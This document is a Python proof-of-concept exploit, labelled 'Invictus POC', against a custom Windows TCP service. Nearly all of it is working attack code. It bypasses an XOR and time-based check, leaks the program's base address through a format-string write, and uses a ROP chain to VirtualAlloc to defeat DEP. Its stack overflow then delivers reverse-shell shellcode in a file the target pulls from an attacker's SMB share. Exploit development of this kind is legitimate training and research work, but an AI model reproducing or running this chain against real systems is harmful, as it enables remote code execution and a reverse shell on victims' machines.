            intbasemain + 0x4877,                   # ret ;
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x928d,                   # mov edx, eax ; mov eax, edx ; ret ;
            # Use value to calculate offset
            intbasemain + 0x3f57,                   # pop eax ; pop ecx ; ret
            ropskelAlign & 0xffffffff, 
            intbasemain + 0x4877,                   # ret ; 
            intbasemain + 0x84df,                   # add edx, eax; mov eax, edx; ret; 
            # RET to EAX in ESP
            intbasemain + 0x6868,                   # xchg eax, esp ; sbb eax, 0x18890000 ; add esp, 0x18 ; add eax, 0x04 ; pop ebx ; ret ;
            intbasemain + 0x4877,                   # ret ; 
                                 
        ]
        return rop_chain1_gadgets

class Network:
    def create_tcp(host,port):
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_tcp.connect((host, port))
        return sock_tcp

    def sendrecv(host,port,recv,recvsize,buffer):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(buffer)
            if recv:
                response = s.recv(recvsize)
                s.close()
                return response
            else:
                s.close()
                return False
        except Exception:
            traceback.print_exc()
            sys.exit(0)
        except KeyboardInterrupt:
            Helpers.keyboard_interrupt() 

    def sendrecv_gsock(sock,recv,recvsize,buffer):
        try:
            s = sock
            s.send(buffer)
            if recv:
                response = s.recv(recvsize)
                # s.close()
                return response
            else:
                # s.close()
                return False
        except Exception:
            traceback.print_exc()
            sys.exit(0)
        except KeyboardInterrupt:
            Helpers.keyboard_interrupt() 

    def send(host,port,recv,recvsize,buffer):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(buffer)
            s.close()
        except Exception:
            traceback.print_exc()
            sys.exit(0)
        except KeyboardInterrupt:
            Helpers.keyboard_interrupt() 
            
    def send_gsock(sock,buffer):
        try:
            s = sock
            s.send(buffer)
            # s.close()
        except Exception:
            traceback.print_exc()
            sys.exit(0)
        except KeyboardInterrupt:
            Helpers.keyboard_interrupt() 

class Payload:
    def passInitial(opcode,suffixtime): 
        # Lengths
        maxlen = 0x1000
        
        # Offsets
        lenprefix = 0x14
        
        # Values
        # XORVAL 1
        xorval1 = pack("<L",0x5956475B)
        # XORVAL 2
        shlval = suffixtime << 4
        orval = shlval | 0xffff0000
        shrval = orval >> 8
        xorbase1 = shrval ^ 0x63747573
        xorbase2 = xorbase1 ^ 0x30383132
        xorval2 = pack("<L",xorbase2)
        # CMPVAL's
        cmpval1 = pack("<I", 0x200)
        # cmpval1 = pack("<I", 0x250)
        cmpval2 = pack("<I", opcode)
        # CMPVAL 3
        xorcmp1 = 0x200 ^ 0x30383132
        shlxor = Helpers.toIntByte(xorcmp1 << 9)
        mulval = Helpers.toIntByte(shlxor * 0x10624dd3,'big','start')
        shrmul = Helpers.toIntByte(mulval >> 6)
        cmpval3 = pack("<L", shrmul)
        
        # Building buffer
        buffer = b""
        buffer += xorval1
        buffer += xorval2
        buffer += cmpval1
        buffer += cmpval2
        buffer += cmpval3
        buffer += b"A" * (lenprefix - len(buffer))
        # buffer += b"B" * (maxlen - len(buffer))

        return buffer
    
    def writefmtFile(filename): 
        # Lengths
        maxlen = 0x1000
        lenmsg = 0x500
        # Maximum length for msg is 0x100; split in 2
        lenprintchars = 0x300
        lenprefix = 0x4
        lenfmtchar = 0x9
        lenfmtval = int(lenprintchars/lenfmtchar)                   # "00000000:", split by length
        
        # Format value
        fmtval = b"%08x:"
        
        # Building buffer
        buffer = b""
        buffer += filename + b"\x00"
        buffer += b"A" * (lenprefix)                
        buffer += b":"
        buffer += fmtval * lenfmtval
        buffer += b"B" * (lenmsg - (lenprintchars + lenprefix))
        buffer += b"\x00" * (maxlen - len(buffer))

        return buffer

    def delprogramLog(): 
        # Lengths
        maxlen = 0x200
        
        # Building buffer
        buffer = b""
        buffer += b"A" * (maxlen - len(buffer))

        return buffer

    def readFile(filename): 
        # Lengths
        maxlen = 0x400
        
        # Building buffer
        buffer = b""
        buffer += filename + b"\x00"
        buffer += b"A" * (maxlen - len(buffer))

        return buffer

    def copyFile(filename1,filename2): 
        # Lengths
        maxlen = 0x2000
        
        # Building buffer
        buffer = b""
        buffer += filename1 + b"\x00"
        buffer += filename2 + b"\x00"
        buffer += b"B" * (maxlen - len(buffer))

        return buffer

    def deleteFile(filename): 
        # Lengths
        maxlen = 0x300
        
        # Building buffer
        buffer = b""
        buffer += filename
        buffer += b"A" * (maxlen - len(buffer))

        return buffer
    
    def writePadding(filename): 
        # Lengths
        maxlen = 0x800
        
        # Building buffer
        buffer = b""
        buffer += filename + b"\x00"
        buffer += b"%0284x" * 0x1
        buffer += b"C" * (maxlen - len(buffer))

        return buffer

    def crashFile(intbasemainaddr,ropskelva,ropchainva,shellcode,alignesp): 
        # Lengths
        maxlen = 0x800
        
        # Offsets
        offseteip = 0x11c
        offsetsubesp = 0x29
        
        # ROP's
        retnop = pack("<L", intbasemainaddr + 0x411b)       # ret ;
        stackpivot = pack("<L", intbasemainaddr + 0x115a)       # add esp, 0x2C ; ret ;
        
        # NOP
        nopsled = b"\x90" * 0x10

        # Building buffer
        buffer = b""
        buffer += b"B" * (offseteip - offsetsubesp - len(ropskelva))
        buffer += ropskelva
        buffer += b"C" * (offseteip - len(buffer))
        buffer += stackpivot
        buffer += retnop * 0xb
        buffer += ropchainva
        buffer += nopsled
        buffer += alignesp
        buffer += shellcode
        buffer += b"D" * (maxlen - len(buffer))
            
        # Returns buffer
        return buffer

class Program:
    def sendFunction(opcode,filename1=False,filename2=False,returndata=False,debug=False):
        ### OPCODES ###
        # 2048: Read file
        # 2049: Open and write file
        # 2050: Copy file
        # 2051: Delete file
        # 2052: Open log file fixed path and read   # "C:\\windows\\temp\\invictus_log.txt"
        # 2053: Delete fixed path log file          # "C:\\windows\\temp\\invictus_log.txt"
        starttime = 0x0
        endtime = 0xfff
        programlog = b"C:\\windows\\temp\\invictus_log.txt"
        print("[*] Attempting to ", end = "")
        if opcode == 2048:
            print("read file " + filename1.decode() + " ...")
            payload = Payload.readFile(filename1)
        elif opcode == 2049:
            print("write file using formatting codes " + filename1.decode() + " ...")
            payload = Payload.writefmtFile(filename1)
        elif opcode == 2050:
            print("copy file " + filename1.decode() + " ...")
            payload = Payload.copyFile(filename1,filename2)
        elif opcode == 2051:
            print("delete file " + filename1.decode() + " ...")
            payload = Payload.deleteFile(filename1)
        elif opcode == 2052:
            print("read program log " + programlog.decode() + " ...")
            payload = Payload.readFile(programlog)
        elif opcode == 2053:
            print("delete program log file " + programlog.decode() + " ...")
            payload = Payload.delprogramLog()
        recvsize = 1024
        for time in range(starttime,endtime):
            # Create global socket
            gsock = Network.create_tcp(host,port)
            # Create payloads
            paylInitial = Payload.passInitial(opcode,time)
            # Send payloads
            Network.sendrecv_gsock(gsock,False,recvsize,paylInitial)
            resp = Network.sendrecv_gsock(gsock,True,recvsize,payload).decode('utf-8')
            if "OK" in resp:
                gsock.close()
                return resp
            if resp is not None and debug:
                print("[*] Using time value " + str(hex(time)) + " and opcode " + str(opcode))
                print(resp)
        gsock.close()
        return
    
# Main
def main(argv):
    parser = argparse.ArgumentParser(description='Invictus POC')
    parser.add_argument("--target", "-t", required=True, help="The host of the target.")
    parser.add_argument("--port", "-p", required=True, type=int, help="The port of the target")
    parser.add_argument("--winver", "-w", required=True, type=int, help="Version of Windows")
    parser.add_argument("--smbip", "-i", required=True, help="SMB IP")
    parser.add_argument("--smbshare", "-s", required=True, help="SMB share")
    parser.add_argument("--revip", "-ri", required=False, nargs='?', help="Reverse IP")
    parser.add_argument("--revport", "-rp", required=False, type=int,nargs='?', help="Reverse port")
    args = parser.parse_args()

    # Globals
    global host, port
    global gsock

    # Vars
    host = args.target
    port = args.port
    winver = args.winver
    smbip = args.smbip
    smbshare = args.smbshare
    revip = args.revip
    revport = args.revport

    ### OPCODES ###
    # 2048: Read file
    # 2049: Open and write file
    # 2050: Copy file
    # 2051: Delete file
    # 2052: Open log file fixed path and read   # "C:\\windows\\temp\\invictus_log.txt"
    # 2053: Delete fixed path log file          # "C:\\windows\\temp\\invictus_log.txt"
    opcoderead = 2048
    opcodewrite = 2049
    opcodecopy = 2050
    opcodedel = 2051
    opcodefixedread = 2052
    opcodefixeddel = 2053

    ### ADD VARS HERE ###
    programlogfile = b"c:\\windows\\temp\\invictus_log.txt"
    customlogfile = b"c:\\users\\public\\testfile.txt"
    crashfilename = "crashfile.txt"
    crashfilepath = crashfilename
    crashsmbfile = b"\\\\" + smbip.encode('utf-8') + b"\\" + smbshare.encode('utf-8') + b"\\" + crashfilename.encode('utf-8')
    intmainbaseaddr = 0x0
    
    # Offset to Kernel32!VirtualAlloc
    offsetk32va = 0xf224
       
    # ROP offset vars
    ropskelfuncOffset = -0x75
    ropskelscOffset = 0x339 
    ropskelalign = -0x321
    
    # Shellcode
    shellcode = Shellcode.asmrevshellShellcode(revip,revport)
    # shellcode = Shellcode.msfcalcShellcode()
    
    # Value for aligning ESP after running VirtualAlloc
    alignesp = Helpers.scAlignASM(0x32d)
    
    try:
        print("In order to run, setup an SMB server locally.")
        print("E.g.; run Impacket by using: '$ sudo impacket-smbserver files /tmp -smb2support'")
        input(Colors.BOLD + "\n[*] PRESS ENTER TO CONNECT AND SEND PAYLOAD" + Colors.END)
        
        ### LEAK ADDRESSES ###
        print(Colors.BOLD + "\n[*] LEAKING ADDRESSES...\n" + Colors.END)
        Program.sendFunction(opcodefixeddel)
        Program.sendFunction(opcodewrite,customlogfile)
        resp = Program.sendFunction(opcodefixedread,programlogfile,None,True)
        if resp != None:
            splitted = resp.split("with content")
            print(splitted)
            # Hacky solution, but works for now
            if winver == 11:
                leakedaddr = splitted[1].split(":")[2]
            elif winver == 10:
                leakedaddr = splitted[1].split(":")[1]
            else:
                print("[!] Invalid Windows version, please correct...")
                sys.exit(0)
            # Bitwise base address
            intmainbaseaddr = int(leakedaddr, 16) & 0xffff0000
        else:
            print("[!] File not created, exiting...")
            sys.exit(0)
        
        print("[i] Baseaddress of main binary is " + hex(intmainbaseaddr))

        ### ROP ###
        ropskelva_gadgets = ROP.vaSkeleton()
        ropskelva = b''.join(pack('<L',_) for _ in ropskelva_gadgets)
        ropchainva_gadgets = ROP.chainVirtualAlloc(intmainbaseaddr,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskelalign)
        ropchainva = b''.join(pack('<L',_) for _ in ropchainva_gadgets) 
          
        ### CRASH / EIP OVERWRITE FUNCTION HERE ###
        print(Colors.BOLD + "\n[*] CREATING AND OBTAINING CRASH PAYLOAD...\n" + Colors.END)
        
        """
        ### OLD METHOD, USING BUFFER IN LOGFILE; too small memory-islands
        # Padding %x, causing to land EIP in start of nearly 0x100 size of buffer
        Program.sendFunction(opcodefixeddel)
        payljunk = Payload.writePadding(customlogfile)    
        """
        
        # Creating payload file
        crashbuf = Payload.crashFile(intmainbaseaddr,ropskelva,ropchainva,shellcode,alignesp)
        with open(crashfilepath,"wb") as crashfile:
            crashfile.write(crashbuf)
        os.chmod(crashfilepath, 0o755)

        # Getting file from SMB
        Program.sendFunction(opcoderead,crashsmbfile,None)      
        
    except Exception:
        traceback.print_exc()
        sys.exit(0)
    except KeyboardInterrupt:
        Helpers.keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])


